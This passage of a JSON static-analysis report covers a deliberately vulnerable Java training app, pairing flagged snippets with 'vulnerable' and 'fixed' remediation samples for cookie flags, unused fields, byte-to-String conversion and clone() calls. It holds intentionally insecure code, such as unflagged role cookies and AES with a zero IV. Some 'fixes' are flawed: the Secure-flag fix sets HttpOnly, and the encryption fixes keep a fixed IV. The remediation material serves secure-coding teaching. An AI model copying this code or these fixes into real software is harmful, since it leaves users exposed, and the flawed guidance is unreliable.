Date());\nuserAccountBean.setCreatedDate(strDate);\n....\n}", "nonvulncode": "UserController.java\n//class level definition with ThreadLocal<em class=\"bold\">\nprivate static ThreadLocal&lt;SimpleDateFormat&gt; dateFormat= new ThreadLocal&lt;SimpleDateFormat&gt;() {\n\t\t@Override\n        public SimpleDateFormat initialValue() {\n            return new SimpleDateFormat(&quot;dd/MM/yyyy&quot;);\n        }\n\t};\n</em>public ModelAndView addUser(@ModelAttribute(&quot;userAccountBean&quot;) UserAccountBean userAccountBean) throws SQLException, NamingException\n\t{\n\u2026.\nString strDate = dateFormat.<em class=\"blue\">get().format(new Date());\nuserAccountBean.setCreatedDate(strDate);</em>\n<em class=\"blue\">dateFormat.remove();</em>\n....\n}", "comments": "According to the SimpleDateFormat definitions: Date formats are not synchronized. It is recommended to create separate format instances for each thread. If multiple threads access a format concurrently, it must be synchronized externally.\n\nWhen using SimpleDateFormat in a thread, there will be cases where the data may not be formatted correctly and this will propagate to some random records in the database (e.g. 1/2/21 may be stored as Jan 2nd, or Feb 1st depending to the race condition). \n\nIf required to have the Date as a class level variable, use ThreadLocal: it enables the program to create variables that can only be read and written by the same thread. Separate SimpleDateFormat object will be created for every thread that uses it. \n\nReference: https://www.baeldung.com/java-threadlocal", "impact": "When using ThreadLocal, It is necessary to clean up the thread local variable using the remove method to avoid re-using the same ThreadLocal data for the new thread/request.", "abstract": "Use of ThreadLocal"}]}, "mitigations": null}}}, "Dead Code: Unused Field": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00390", "function": "Field: key()", "line": "86", "snippet": "//private static final Logger logger = LoggerFactory.getLogger(EmployeeController.class);\n\tprivate static Cipher ecipher;\n\tprivate static SecretKey key;\n\tprivate boolean isWrong;\n\tprivate static SimpleDateFormat dateFormat= new SimpleDateFormat(\"dd/MM/yyyy\");"}]}, {"file": "src/com/accenture/sec/dao/EmployeeDAOImpl.java", "items": [{"id": "IN00391", "function": "Field: mailSender()", "line": "47", "snippet": "@Autowired\n    private JavaMailSender mailSender;\n\t\n\t//vul 160 B2"}]}, {"file": "src/com/accenture/sec/controller/StudentController.java", "items": [{"id": "IN00392", "function": "Field: userDetailsService()", "line": "37", "snippet": "StudentDAO studentDAO;\n\t@Autowired\n    private UserDetailsService userDetailsService;\n\t\n\tprivate Integer grade=null;"}]}], "remediation": {"remediation": {"@id": "R.0138", "@name": "Dead Code: Unused Field", "@dateLastModified": "1/20/2021", "faqs": null, "recommendations": {"recommendation": [{"@type": ".NET/C#/ASP", "vulncode": "private int GetDepartmentId(string departmentName)\n        {\n            int departmentId = 0;\n            SqlConnection con = new SqlConnection(ConfigurationManager.ConnectionStrings[&quot;VulnAppDBConnection&quot;].ConnectionString);\n\n            con.Open();\n            using (SqlCommand command = new SqlCommand(&quot;Select Id, Name From dbo.Department Where Name=@departmentName&quot;, con))\n            {\n                command.Parameters.Add(new SqlParameter(&quot;departmentName&quot;, departmentName));\n\n                SqlDataReader reader = command.ExecuteReader();\n               <em class=\"red\"> List&lt;Department&gt; listDepartments = new List&lt;Department&gt;();</em>\n                while (reader.Read())\n                {\n                    departmentId = Convert.ToInt32(reader[&quot;Id&quot;]);   \n                }\n                con.Close();\n            }\n            return departmentId;\n        }", "nonvulncode": "private int GetDepartmentId(string departmentName)\n        {\n            int departmentId = 0;\n            SqlConnection con = new SqlConnection(ConfigurationManager.ConnectionStrings[&quot;VulnAppDBConnection&quot;].ConnectionString);\n\n            con.Open();\n            using (SqlCommand command = new SqlCommand(&quot;Select Id, Name From dbo.Department Where Name=@departmentName&quot;, con))\n            {\n                command.Parameters.Add(new SqlParameter(&quot;departmentName&quot;, departmentName));\n\n                SqlDataReader reader = command.ExecuteReader();\n                <em class=\"blue\">//unused field has been removed</em>\n                while (reader.Read())\n                {\n                    departmentId = Convert.ToInt32(reader[&quot;Id&quot;]);   \n                }\n                con.Close();\n            }\n            return departmentId;\n        }", "comments": "Unused field shoud be removed because it may increase compiled code, memory usage, adds maintenability complexity and causes confusion. \nIn case of future use, provide comments that the field is to be used.", "impact": "NA", "abstract": "removed unused field"}, {"@type": "JAVA/JSP", "vulncode": "public String sendEmail(String to, String subject, String body) \n    {\n\t\t\n\t\tString mailMessage=null;\n<em class=\"red\">List&lt;String&gt; emailIDs = new ArrayList&lt;String&gt;();</em>\n\t\ttry (InputStream input = LoginDAO.class.getResourceAsStream(&quot;/com/accenture/sec/resources/sec_conn.properties&quot;)) {\n\t\t\t//File absolute path given, absolute path should begin with /\n\n\t\t\t\tProperties prop = new Properties();\t\t\n\t\t\t\tprop.load(input);\n\t\t\t\tString host = prop.getProperty(&quot;sec_email_host&quot;);\nString storedPassword = null;\n\n\t\t\t\tif(prop.getProperty(&quot;sec_email_pwd&quot;)!=null) {\n\t\t\t\t\tstoredPassword  = prop.getProperty(&quot;sec_email_pwd&quot;);\n\t\t\t\t}\n\t\t        SimpleMailMessage message = new SimpleMailMessage();\n\t\t        \n\t\t        JavaMailSenderImpl mailSender = new JavaMailSenderImpl();\n\t\t\t    mailSender.setHost(host);\n\t\t\t    mailSender.setPort(587);\n\t\t\t    \n\t\t\t    mailSender.setUsername(&quot;gurupriyat@gmail.com&quot;);\n\t\t\t    mailSender.setPassword(storedPassword);\n\t\t\t    \n\t\t\t    Properties props = mailSender.getJavaMailProperties();\n\t\t\t    props.put(&quot;mail.transport.protocol&quot;, &quot;smtp&quot;);\n\t\t\t    props.put(&quot;mail.smtp.auth&quot;, &quot;true&quot;);\n\t\t\t    props.put(&quot;mail.smtp.starttls.enable&quot;, &quot;true&quot;);\n\t\t\t    props.put(&quot;mail.debug&quot;, &quot;true&quot;);\n\t\t\n\t\t        message.setTo(to);\n\t\t        message.setSubject(subject);\n\t\t        message.setText(body);\n\t\t        mailSender.send(message);\n\t\t        \n\t\t        mailMessage = &quot;Email sent successfully&quot;;\n    \t}", "nonvulncode": "public String sendEmail(String to, String subject, String body) \n    {\n\t\t\n\t\tString mailMessage=null;\n<em class=\"blue\">//Remove the unused variable, it will unnecessarily allocate capacity.</em>\n\t\ttry (InputStream input = LoginDAO.class.getResourceAsStream(&quot;/com/accenture/sec/resources/sec_conn.properties&quot;)) {\n\t\t\t//File absolute path given, absolute path should begin with /\n\n\t\t\t\tProperties prop = new Properties();\t\t\n\t\t\t\tprop.load(input);\n\t\t\t\tString host = prop.getProperty(&quot;sec_email_host&quot;);\nString storedPassword = null;\n\n\t\t\t\tif(prop.getProperty(&quot;sec_email_pwd&quot;)!=null) {\n\t\t\t\t\tstoredPassword  = prop.getProperty(&quot;sec_email_pwd&quot;);\n\t\t\t\t}\n\t\t        SimpleMailMessage message = new SimpleMailMessage();\n\t\t        \n\t\t        JavaMailSenderImpl mailSender = new JavaMailSenderImpl();\n\t\t\t    mailSender.setHost(host);\n\t\t\t    mailSender.setPort(587);\n\t\t\t    \n\t\t\t    mailSender.setUsername(&quot;gurupriyat@gmail.com&quot;);\n\t\t\t    mailSender.setPassword(storedPassword);\n\t\t\t    \n\t\t\t    Properties props = mailSender.getJavaMailProperties();\n\t\t\t    props.put(&quot;mail.transport.protocol&quot;, &quot;smtp&quot;);\n\t\t\t    props.put(&quot;mail.smtp.auth&quot;, &quot;true&quot;);\n\t\t\t    props.put(&quot;mail.smtp.starttls.enable&quot;, &quot;true&quot;);\n\t\t\t    props.put(&quot;mail.debug&quot;, &quot;true&quot;);\n\t\t\n\t\t        message.setTo(to);\n\t\t        message.setSubject(subject);\n\t\t        message.setText(body);\n\t\t        mailSender.send(message);\n\t\t        \n\t\t        mailMessage = &quot;Email sent successfully&quot;;\n    \t}", "comments": "From Java 8, default capacity of ArrayList is 0 until we add atleast one object into the ArrayList, which is done to save memory consumption. Unused field should be removed because it may increase code compilation, memory usage, adds maintenability complexity and causes confusion. \nIn case of future use, provide comments that the field is to be used.", "impact": "No impact", "abstract": "Removal of unused field"}]}, "mitigations": {"mitigation": {"system": "N/A", "configuration": "N/A", "backend": "N/A", "frontend": "N/A", "comments": "Extra layers (e.g. NGFW, WAF, OS hardening, mod_rewrite, configurations, etc.) are not able to protect against this type of vulnerability due to the nature of the vulnerability itseft, or if added an extra layer it will have a huge impact on the system performance."}}}}}, "Code Correctness: Byte Array to String Conversion": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00414", "function": "String()", "line": "546", "snippet": "decodedByte = cipher.doFinal(decodedByte);\n\t\t\tSystem.out.println(\"decodedByte2---\"+decodedByte);\n\t\t\tString decryptedTxt = new String(decodedByte);\n\t\t\tSystem.out.println(\"decryptedTxt---\"+decryptedTxt);"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00415", "function": "String()", "line": "403", "snippet": "ecipher.init(Cipher.DECRYPT_MODE, key, new PBEParameterSpec(new byte[16], 50));\n            byte[] decrptByte=ecipher.doFinal(Base64.getDecoder().decode(encrypted));            \n            String decrypted = new String(decrptByte); \n                        \n\t\t} catch (NoSuchAlgorithmException e) {"}]}], "remediation": {"remediation": {"@id": "R.0132", "@name": "Code Correctness: Byte Array to String Conversion", "@dateLastModified": "8/7/2020", "faqs": null, "recommendations": {"recommendation": [{"@type": "JAVA/JSP", "vulncode": "private String encryptAES(String password) {\n\t\t\n\t\tString encrypted=null;\n\t\ttry {\n\t\t\tkey = KeyGenerator.getInstance(&quot;AES&quot;).generateKey();\n\t\t \n\t\t\t//&quot;AES/CBC/PKCS5PADDING&quot; mode to be used to avoid insecure mode of operation\n            ecipher = Cipher.getInstance(&quot;AES/CBC/PKCS5PADDING&quot;);            \n            ecipher.init(Cipher.ENCRYPT_MODE, key, new IvParameterSpec(new byte[16]));            \n         \n            byte[] enc = ecipher.doFinal(password.getBytes<em class=\"red\">(&quot;UTF-8&quot;)</em>);                    \n       <em class=\"red\">     encrypted = new String(enc, &quot;UTF-8&quot;);</em>\n            \n            ecipher.init(Cipher.DECRYPT_MODE, key, new IvParameterSpec(new byte[16]));\n            byte[] dec_utf =ecipher.doFinal(dec); <em class=\"red\">//decrypt will fail, if byte[] is not properly converted to string</em>\n            \n            String decrypted = new String(dec_utf,<em class=\"red\"> &quot;UTF-8&quot;</em>);\n           \n\t\t} catch (NoSuchAlgorithmException e) {\n\t\t\tlogger.error(&quot;error in encrypt/decrypt&quot;, e);\n\t\t} catch (UnsupportedEncodingException e) {\n\t\t\tlogger.error(&quot;error in encrypt/decrypt&quot;, e);\n\t\t} catch (IllegalBlockSizeException e) {\n\t\t\tlogger.error(&quot;error in encrypt/decrypt&quot;, e);\n\t\t} catch (BadPaddingException e) {\n\t\t\tlogger.error(&quot;error in encrypt/decrypt&quot;, e);\n\t\t} catch (InvalidKeyException e) {\n\t\t\tlogger.error(&quot;error in encrypt/decrypt&quot;, e);\n\t\t} catch (NoSuchPaddingException e) {\n\t\t\tlogger.error(&quot;error in encrypt/decrypt&quot;, e);\n\t\t} catch (InvalidAlgorithmParameterException e) {\n\t\t\tlogger.error(&quot;error in encrypt/decrypt&quot;, e);\n\t\t} \n\t\treturn encrypted;\n\t}", "nonvulncode": "private String encryptAES(String password) {\n\t\t\n\t\tString encrypted=null;\n\t\ttry {\n\t\t\tkey = KeyGenerator.getInstance(&quot;AES&quot;).generateKey();\n\t\t    ecipher = Cipher.getInstance(&quot;AES/CBC/PKCS5PADDING&quot;);           \n            ecipher.init(Cipher.ENCRYPT_MODE, key, new IvParameterSpec(new byte[16]));\n            \n            byte[] enc = ecipher.doFinal(password.getBytes());\n         \n          <em class=\"blue\">  // encode to base64, Java 8 has inbuilt base64  \n            encrypted = Base64.getEncoder().encodeToString(enc);</em>\n            \n            ecipher.init(Cipher.DECRYPT_MODE, key, new IvParameterSpec(new byte[16]));            \n            byte[] decrptByte=ecipher.doFinal(<em class=\"blue\">Base64.getDecoder().decode(encrypted)</em>);            \n            String decrypted = new String(decrptByte);            \n            \n\t\t} catch (NoSuchAlgorithmException e) {\n\t\t\te.printStackTrace();\n\t\t} catch (IllegalBlockSizeException e) {\n\t\t\te.printStackTrace();\n\t\t} catch (BadPaddingException e) {\n\t\t\te.printStackTrace();\n\t\t} catch (InvalidKeyException e) {\n\t\t\te.printStackTrace();\n\t\t} catch (NoSuchPaddingException e) {\n\t\t\te.printStackTrace();\n\t\t} catch (InvalidAlgorithmParameterException e) {\n\t\t\te.printStackTrace();\n\t\t}\t\t\n\t\treturn encrypted;\n\t}", "comments": "While storing byte[] to string, we should use encoding which has one-to-one mapping between character and bytes like base64. By using base64, we will not lose data.\n\nBase64 internally uses ISO-8859-1 charset. \n\nAnother way of achieving byte[] to string conversion without losing data, is to use &quot;ISO-8859-1&quot; encoding directly.", "impact": "no impact", "abstract": "Use of Base64"}, {"@type": "JAVA/JSP", "vulncode": "private String encryptAES(String password) {\n\t\t\n\t\tString encrypted=null;\n\t\ttry {\n\t\t\tkey = KeyGenerator.getInstance(&quot;AES&quot;).generateKey();\n\t\t \n\t\t\t//&quot;AES/CBC/PKCS5PADDING&quot; mode to be used to avoid insecure mode of operation\n            ecipher = Cipher.getInstance(&quot;AES/CBC/PKCS5PADDING&quot;);            \n            ecipher.init(Cipher.ENCRYPT_MODE, key, new IvParameterSpec(new byte[16]));            \n         \n            byte[] enc = ecipher.doFinal(password.getBytes<em class=\"red\">(&quot;UTF-8&quot;)</em>);                    \n       <em class=\"red\">     encrypted = new String(enc, &quot;UTF-8&quot;);</em>\n            \n            ecipher.init(Cipher.DECRYPT_MODE, key, new IvParameterSpec(new byte[16]));\n            byte[] dec_utf =ecipher.doFinal(dec); <em class=\"red\">//decrypt will fail, if byte[] is not properly converted to string</em>\n            \n            String decrypted = new String(dec_utf,<em class=\"red\"> &quot;UTF-8&quot;</em>);\n           \n\t\t} catch (NoSuchAlgorithmException e) {\n\t\t\tlogger.error(&quot;error in encrypt/decrypt&quot;, e);\n\t\t} catch (UnsupportedEncodingException e) {\n\t\t\tlogger.error(&quot;error in encrypt/decrypt&quot;, e);\n\t\t} catch (IllegalBlockSizeException e) {\n\t\t\tlogger.error(&quot;error in encrypt/decrypt&quot;, e);\n\t\t} catch (BadPaddingException e) {\n\t\t\tlogger.error(&quot;error in encrypt/decrypt&quot;, e);\n\t\t} catch (InvalidKeyException e) {\n\t\t\tlogger.error(&quot;error in encrypt/decrypt&quot;, e);\n\t\t} catch (NoSuchPaddingException e) {\n\t\t\tlogger.error(&quot;error in encrypt/decrypt&quot;, e);\n\t\t} catch (InvalidAlgorithmParameterException e) {\n\t\t\tlogger.error(&quot;error in encrypt/decrypt&quot;, e);\n\t\t} \n\t\treturn encrypted;\n\t}", "nonvulncode": "private String encryptAES(String password) {\n\t\t\n\t\tString encrypted=null;\n\t\ttry {\n\t\t\tkey = KeyGenerator.getInstance(&quot;AES&quot;).generateKey();\n\t\t    ecipher = Cipher.getInstance(&quot;AES/CBC/PKCS5PADDING&quot;);           \n            ecipher.init(Cipher.ENCRYPT_MODE, key, new IvParameterSpec(new byte[16]));\n            \n            byte[] enc = ecipher.doFinal(password.getBytes());\n         \n            encrypted = new String(enc,<em class=\"blue\"> &quot;ISO-8859-1&quot;);</em>\n            \n            ecipher.init(Cipher.DECRYPT_MODE, key, new IvParameterSpec(new byte[16]));            \n            byte[] decrptByte=ecipher.doFinal(<em class=\"blue\">encrypted.getBytes(&quot;ISO-8859-1&quot;)</em>);            \n            String decrypted = new String(decrptByte);            \n            \n\t\t} catch (NoSuchAlgorithmException e) {\n\t\t\te.printStackTrace();\n\t\t} catch (IllegalBlockSizeException e) {\n\t\t\te.printStackTrace();\n\t\t} catch (BadPaddingException e) {\n\t\t\te.printStackTrace();\n\t\t} catch (InvalidKeyException e) {\n\t\t\te.printStackTrace();\n\t\t} catch (NoSuchPaddingException e) {\n\t\t\te.printStackTrace();\n\t\t} catch (InvalidAlgorithmParameterException e) {\n\t\t\te.printStackTrace();\n\t\t}\t\t\n\t\treturn encrypted;\n\t}", "comments": "While storing byte[] to string, we should use encoding which has one-to-one mapping between character and bytes like base64. By using base64, we will not lose data.\n\nBase64 internally uses ISO-8859-1 charset. \n\nAnother way of achieving byte[] to string conversion without losing data, is to use &quot;ISO-8859-1&quot; encoding directly.", "impact": "no impact", "abstract": "Use of ISO-8859-1 charset"}]}, "mitigations": {"mitigation": {"system": "N/A", "configuration": "N/A", "backend": "N/A", "frontend": "N/A", "comments": "Extra layers (e.g. NGFW, WAF, OS hardening, mod_rewrite, configurations, etc.) are not able to protect against this type of vulnerability due to the nature of the vulnerability itseft, or if added an extra layer it will have a huge impact on the system performance."}}}}}, "Code Correctness: clone() Invokes Overridable Function": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/dao/StudentDAO.java", "items": [{"id": "IN00416", "function": "FunctionCall: getStudentSubjectGradeList()", "line": "33", "snippet": "public Object clone() throws CloneNotSupportedException {\n\t\ttry {\n\t\t\tgetStudentSubjectGradeList(null,null);\n\t\t} catch (NamingException e) {\n\t\t\t// TODO Auto-generated catch block"}]}, {"file": "src/com/accenture/sec/dao/EmployeeDAOImpl.java", "items": [{"id": "IN00417", "function": "FunctionCall: getDepartmentMap()", "line": "62", "snippet": "final EmployeeDAOImpl clone = (EmployeeDAOImpl) super.clone();\n\t\ttry {\n\t\t\tdepartmentMap =  getDepartmentMap();\n\t\t} catch (Exception e) {\n\t\t\tlogger.debug(\"Error in cloning\");"}]}], "remediation": {"remediation": {"@id": "R.0170", "@name": "Code Correctness: clone() Invokes Overridable Function", "@dateLastModified": "11/20/2020", "faqs": null, "recommendations": {"recommendation": {"@type": "JAVA/JSP", "vulncode": "<em class=\"bold\">EmployeeDAO.class</em>\npublic class EmployeeDAOImpl extends CommonDAO implements EmployeeDAO,Cloneable{\n\u2026.\npublic Object clone() throws CloneNotSupportedException {\n\t\tMap&lt;Integer, String&gt; departmentMap = new HashMap&lt;Integer, String&gt;();\nfinal EmployeeDAOImpl clone = (EmployeeDAOImpl) super.clone();\n\t\ttry {\n\t\t\t<em class=\"red\">departmentMap =  getDepartmentMap();</em>\n\t\t} catch (Exception e) {\n\t\t\tlogger.debug(&quot;Error in cloning&quot;);\n\t\t}\n\t\treturn clone;\n\t}\n}\n\n<em class=\"red\">public Map&lt;Integer, String&gt; getDepartmentMap() throws Exception{</em>\t\n\t\tMap&lt;Integer, String&gt; departmentMap = new HashMap&lt;Integer, String&gt;();\n\t\tEntityManager em=entityManagerFactory.createEntityManager();\t\n\t\ttry {\n\t\t\tCriteriaBuilder cb = em.getCriteriaBuilder();\n\t\t\tCriteriaQuery&lt;DepartmentEntity&gt; cr = cb.createQuery(DepartmentEntity.class);\n\t\t\tRoot&lt;DepartmentEntity&gt; root = cr.from(DepartmentEntity.class);\n\t\t\tcr.select(root);\n\n\t\t\tList&lt;DepartmentEntity&gt; results = CommonDAO.executeQuery(DepartmentEntity.class,cr,em);\n....\n}", "nonvulncode": "<em class=\"bold\">EmployeeDAO.class</em>\npublic class EmployeeDAOImpl extends CommonDAO implements EmployeeDAO,Cloneable{\n\u2026.\npublic Object clone() throws CloneNotSupportedException {\n\t\tMap&lt;Integer, String&gt; departmentMap = new HashMap&lt;Integer, String&gt;();\nfinal EmployeeDAOImpl clone = (EmployeeDAOImpl) super.clone();\n\t\ttry {\n\t\t\t<em class=\"blue\">departmentMap =  getDepartmentMap();\n</em>\t\t} catch (Exception e) {\n\t\t\tlogger.debug(&quot;Error in cloning&quot;);\n\t\t}\n\t\treturn clone;\n\t}\n}\n\n<em class=\"bold\">public final Map&lt;Integer, String&gt; getDepartmentMap() throws Exception{</em>\t\n\t\tMap&lt;Integer, String&gt; departmentMap = new HashMap&lt;Integer, String&gt;();\n\t\tEntityManager em=entityManagerFactory.createEntityManager();\t\n\t\ttry {\n\t\t\tCriteriaBuilder cb = em.getCriteriaBuilder();\n\t\t\tCriteriaQuery&lt;DepartmentEntity&gt; cr = cb.createQuery(DepartmentEntity.class);\n\t\t\tRoot&lt;DepartmentEntity&gt; root = cr.from(DepartmentEntity.class);\n\t\t\tcr.select(root);\n\n\t\t\tList&lt;DepartmentEntity&gt; results = CommonDAO.executeQuery(DepartmentEntity.class,cr,em);\n....\n}", "comments": "Purpose of clone is to create copy of initialized object. When clone calls overridable method, there is chance that malicious subclass could override the method and affect the behavior of the clone() method, also subclass can use the cloned object in partially initialized state.", "impact": "No impact", "abstract": "Use of final method calls from clone method."}}, "mitigations": {"mitigation": {"system": "N/A", "configuration": "N/A", "backend": "N/A", "frontend": "N/A", "comments": "Extra layers (e.g. NGFW, WAF, OS hardening, mod_rewrite, configurations, etc.) are not able to protect against this type of vulnerability due to the nature of the vulnerability itseft, or if added an extra layer it will have a huge impact on the system performance."}}}}}, "Code Correctness: Multiple Stream Commits": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/controller/FormServlet.java", "items": [{"id": "IN00418", "function": "response.sendRedirect(...)", "line": "66", "snippet": "= request.getRequestDispatcher(\"/WEB-INF/jspViews/calculateStudentBMI.jsp\");\n            dispatcher.forward(request, response);\n            response.sendRedirect(\"/WEB-INF/jspViews/calculateStudentBMI.jsp\");\n        \n    }"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00419", "function": "response.getOutputStream()", "line": "398", "snippet": "byte[] byteArray = new byte[bytesToRead];\n            inputStream.read(byteArray);\n            IOUtils.write(byteArray, response.getOutputStream());\n                        \n            inputStream.close();"}]}], "remediation": null}, "Cookie Security: Cookie not Sent Over SSL": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00420", "function": "addCookie(userName)", "line": "223", "snippet": "Cookie userName = new Cookie(\"userName\", bean.getUserName());\n\t\t\t response.addCookie(userName);"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00421", "function": "addCookie(new javax.servlet.http.Cookie())", "line": "187", "snippet": "HttpSession session = request.getSession();\n\t    session.setAttribute(\"color\", value);\n\t    response.addCookie(new Cookie(\"color\", value)); //cwe 312 Cleartext Storage of Sensitive Information ->Improper Neutralization of CRLF Sequences in HTTP Headers, Sensitive Cookie in HTTPS Session Without 'Secure' Attribute\n\t    System.out.format(value); //CWE134_Uncontrolled_Format_String"}]}], "remediation": {"remediation": {"@id": "R.0056", "@name": "Cookie Security: Cookie not Sent Over SSL", "@dateLastModified": "7/21/2020", "faqs": null, "recommendations": {"recommendation": [{"@type": ".NET/C#/ASP", "vulncode": "public ActionResult Login([Bind(Include = &quot;Username,Password&quot;)]AccountVM account)\n        {\n            if (ModelState.IsValid) { \n                SqlConnection conn = new SqlConnection(ConfigurationManager.ConnectionStrings[&quot;VulnAppDBConnection&quot;].ConnectionString);\n                string query = &quot;Select Password, RoleId, FirstName, LastName from dbo.Account Where Username=@Username&quot;;\n                \n                SqlCommand cmd = new SqlCommand(query, conn);\n                cmd.Parameters.Add(new SqlParameter(&quot;Username&quot;, account.Username));\n                conn.Open();\n                using (SqlDataReader dr = cmd.ExecuteReader())\n                {\n                    if (dr.Read())\n                    {\n                        if(DBNull.Value != dr[&quot;Password&quot;])\n                        {\n                            if(dr[&quot;Password&quot;].ToString() == account.Password)\n                            {\n                                Session[&quot;user&quot;] = account.Username;\n                                Session[&quot;role&quot;] = account.GetRoleDef(dr[&quot;RoleId&quot;].ToString());\n                                Session[&quot;FirstName&quot;] = dr[&quot;FirstName&quot;];\n                                Session[&quot;LastName&quot;] = dr[&quot;LastName&quot;];\n\n                                HttpCookie userRole = new HttpCookie(&quot;userRole&quot;, account.GetRoleDef(dr[&quot;RoleId&quot;].ToString()));\n                               <em class=\"red\">//Secure flag is missing</em>\n                                Response.Cookies.Add(userRole);\n                                return View(&quot;Main&quot;);\n                            }\n                        }\n                    }\n                }\n                conn.Close();\n            }\n            TempData[&quot;errmsg&quot;] = &quot;Invalid Credentials.&quot;;\n            return View();\n        }", "nonvulncode": "public ActionResult Login([Bind(Include = &quot;Username,Password&quot;)]AccountVM account)\n        {\n            if (ModelState.IsValid) { \n                SqlConnection conn = new SqlConnection(ConfigurationManager.ConnectionStrings[&quot;VulnAppDBConnection&quot;].ConnectionString);\n                string query = &quot;Select Password, RoleId, FirstName, LastName from dbo.Account Where Username=@Username&quot;;\n                SqlCommand cmd = new SqlCommand(query, conn);\n                cmd.Parameters.Add(new SqlParameter(&quot;Username&quot;, account.Username));\n                conn.Open();\n                using (SqlDataReader dr = cmd.ExecuteReader())\n                {\n                    if (dr.Read())\n                    {\n                        if(DBNull.Value != dr[&quot;Password&quot;])\n                        {\n                            if(dr[&quot;Password&quot;].ToString() == account.Password)\n                            {\n                                Session[&quot;user&quot;] = account.Username;\n                                Session[&quot;role&quot;] = account.GetRoleDef(dr[&quot;RoleId&quot;].ToString());\n                                Session[&quot;FirstName&quot;] = dr[&quot;FirstName&quot;];\n                                Session[&quot;LastName&quot;] = dr[&quot;LastName&quot;];\n                                HttpCookie userRole = new HttpCookie(&quot;userRole&quot;, account.GetRoleDef(dr[&quot;RoleId&quot;].ToString()));\n                                <em class=\"blue\">userRole.Secure = true;</em>\n                                Response.Cookies.Add(userRole);\n                                return View(&quot;Main&quot;);\n                            }\n                        }\n                    }\n                }\n                conn.Close();\n\n            }\n            TempData[&quot;errmsg&quot;] = &quot;Invalid Credentials.&quot;;\n            return View();\n        }", "comments": "If the requirement is to allow accessing the cookie via javascript and not to some sensitive cookie. The fix must be via backend code setting your cookie to HttpOnly to true. If all is sensitive your update must be in the web.config file.\n\nNeed to notify users of cookie and give them the option to opt-out of receiving cookies during navigation. Cookies containing user information (IP, browser, google_ads ID, etc.) must be protected with &quot;Secure&quot;, &quot;Httponly&quot;, set and if possible, set the &quot;SameSite&quot; attribute to &quot;Strict&quot; or &quot;Lax&quot;. see reference https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies# \n\nReferences:\nThe General Data Privacy Regulation (GDPR) in the European Union\nThe ePrivacy Directive in the EU\nThe California Consumer Privacy Act", "impact": "Any scripted code running on the client side (browser) will lose access to the httponly variable (e.g., a local javascript cannot set or access the cookie value set to httponly).", "abstract": "Use of Secure"}, {"@type": "JAVA/JSP", "vulncode": "public ModelAndView validateLogin(@ModelAttribute LoginBean bean, HttpServletRequest request,HttpSession sess, HttpServletResponse response)\n\t{\t\t\n\t\tString uname = request.getParameter(&quot;uname&quot;);\n\t\tString pwd = request.getParameter(&quot;pwd&quot;);\n\t\tModelAndView mv= new ModelAndView();\n\t\t\n\t\tbean=new LoginBean();\n\t\tbean.setUserName(uname);\n\t\tbean.setPassword(pwd);\n\t\t\t\t\n\t\tString res = dao.validateLogin(bean);\n\t\t\t\t\n\t\tif(res.equals(&quot;success&quot;)) {\n\t\t\tmv.setViewName(&quot;success&quot;);\n\t\t\tmv.addObject(&quot;msg&quot;,&quot;Welcome &quot;+bean.getUserName());\n\t\t\tmv.addObject(&quot;userObj&quot;, bean);\n\t\t\tsess.setAttribute(&quot;loginBean&quot;, bean); // Made available across controllers\n\t\t\t//sensitive information is available as cookie in client.\n\t\t\t<em class=\"red\">Cookie userRole = new Cookie(&quot;userRole&quot;,bean.getRoleID());\n\t\t\tresponse.addCookie(userRole);\n</em>\t\t\t \n\t\t\treturn new ModelAndView(&quot;success&quot;,&quot;loginBean&quot;,bean);\n\t\t} else\n\t\t{\n\t\t\tmv.setViewName(&quot;login&quot;);\n\t\t\tmv.addObject(&quot;msg&quot;,&quot;Invalid username or password&quot;);\n\t\t}\n\t\treturn mv;\n\t}", "nonvulncode": "public ModelAndView validateLogin(@ModelAttribute LoginBean bean, HttpServletRequest request,HttpSession sess, HttpServletResponse response)\n\t{\t\t\n\t\tString uname = request.getParameter(&quot;uname&quot;);\n\t\tString pwd = request.getParameter(&quot;pwd&quot;);\n\t\tModelAndView mv= new ModelAndView();\n\t\t\n\t\tbean=new LoginBean();\n\t\tbean.setUserName(uname);\n\t\tbean.setPassword(pwd);\n\t\t\t\t\n\t\tString res = dao.validateLogin(bean);\n\t\t\t\t\n\t\tif(res.equals(&quot;success&quot;)){\n\t\t\tmv.setViewName(&quot;success&quot;);\n\t\t\tmv.addObject(&quot;msg&quot;,&quot;Welcome &quot;+bean.getUserName());\n\t\t\tmv.addObject(&quot;userObj&quot;, bean);\n\t\t\tsess.setAttribute(&quot;loginBean&quot;, bean); // Made available across controllers\n\t\t\t\n\t\t\tCookie userRole = new Cookie(&quot;userRole&quot;,bean.getRoleID());\n<em class=\"blue\">userRole.setHttpOnly(true);</em>\n\t\t\tresponse.addCookie(userRole);\n\t\t\t \n\t\t\treturn new ModelAndView(&quot;success&quot;,&quot;loginBean&quot;,bean);\n\t\t}else\n\t\t{\n\t\t\tmv.setViewName(&quot;login&quot;);\n\t\t\tmv.addObject(&quot;msg&quot;,&quot;Invalid username or password&quot;);\n\t\t}\n\t\treturn mv;\n\t}", "comments": "When HttpOnly flag is used, JavaScript will not be able to read the cookie in case of XSS exploitation. Making the cookie httponly via web.xml, will ensure all the cookie has HttpOnly flag.", "impact": "Any scripted code running on the client side (browser) will lose access to the httponly variable (e.g., a local javascript cannot set or access the cookie value set to httponly).\n\nCase 1: csrf enabled, secure enabled, via http, chrome brows<em class=\"bold\">er</em>\nwhen secure flag is set, browser will not persist/send session cookie over http, so for each request new session id will be sent by browser. Having csrf enabled, this will cause &quot;Expected csrf token not found, has your session expired&quot; issue.\n\n<em class=\"bold\">Solution:</em> When both csrf and secure flag is enabled, accessing the application via https will not have any impact.\n\n<em class=\"bold\">Case 2: csrf enabled, secure not enabled, via http, chrome/other browser</em>\nNo impact, since same session id is sent by browser.\n\nIf doing manually on the controller, this needs to be set for every cookie used by the application. It is preferred to set all cookies to be secure globally in the web.xml", "abstract": "Use of HttpOnly"}]}, "mitigations": {"mitigation": [{"system": 